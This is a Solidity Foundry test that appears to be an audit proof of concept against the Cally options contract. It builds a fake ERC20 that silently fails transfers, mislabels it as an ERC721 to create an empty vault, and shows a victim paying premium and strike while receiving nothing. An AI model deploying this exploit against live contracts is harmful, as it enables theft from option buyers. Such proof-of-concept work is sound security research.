// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../../src/Cally.sol";

contract FalseReturnERC20 {
    string public name = "False Return Token";
    string public symbol = "FRT";
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function totalSupply() external pure returns (uint256) {
        return 0;
    }

    function transfer(address, uint256) external returns (bool) {
        return false; // always fail silently
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address, address, uint256) external returns (bool) {
        return false; // always fail silently
    }
}

contract ExploitTest is Test {
    Cally cally;
    FalseReturnERC20 token;

    address payable attacker = payable(address(0xAA));
    address payable victim   = payable(address(0xBB));

    function setUp() public {
        cally = new Cally();
        token = new FalseReturnERC20();

        vm.deal(attacker, 1 ether);
        vm.deal(victim,   10 ether);
    }

    function test_EmptyVaultExploit() public {
        /*
            1. Attacker creates a vault, intentionally mislabeling the ERC20
               token as an ERC721. No approval is given.
            2. Vault is created even though transferFrom() returned false.
            3. Victim buys and exercises the option, paying both premium and strike.
            4. Attacker receives ETH while victim receives no tokens.
        */

        // -------------------- attacker creates empty vault --------------------
        vm.prank(attacker);

        uint256 vaultId = cally.createVault(
            1_000e18,                       // fake token amount
            address(token),                 // false-returning ERC20
            0,                              // premium index: 0 => 0.01 ETH
            7,                              // durationDays
            0,                              // dutch auction starting strike index
            0.5 ether,                      // reserve strike
            Cally.TokenType.ERC721          // <-- lie: pretend ERC20 is an ERC721
        );

        // token never left attacker, contract holds nothing
        assertEq(token.balanceOf(address(cally)), 0, "Contract should hold zero tokens");

        // -------------------- victim buys the option --------------------------
        uint256 premium = cally.getPremium(vaultId); // 0.01 ether
        vm.prank(victim);
        uint256 optionId = cally.buyOption{value: premium}(vaultId);

        // premium credited to attacker inside Cally
        assertEq(cally.ethBalance(attacker), premium, "Attacker should have received the premium");

        // -------------------- victim exercises the option ---------------------
        Cally.Vault memory vaultAfterBuy = cally.vaults(vaultId);
        uint256 strike = vaultAfterBuy.currentStrike; // strike determined in buyOption

        vm.prank(victim);
        cally.exercise{value: strike}(optionId);

        // strike credited to attacker as well
        assertEq(
            cally.ethBalance(attacker),
            premium + strike,
            "Attacker should have received premium + strike"
        );

        // victim still got zero tokens
        assertEq(token.balanceOf(victim), 0, "Victim received no tokens");

        // vault is marked as exercised
        Cally.Vault memory vaultAfterExercise = cally.vaults(vaultId);
        assertTrue(vaultAfterExercise.isExercised, "Vault should be marked exercised");
    }
}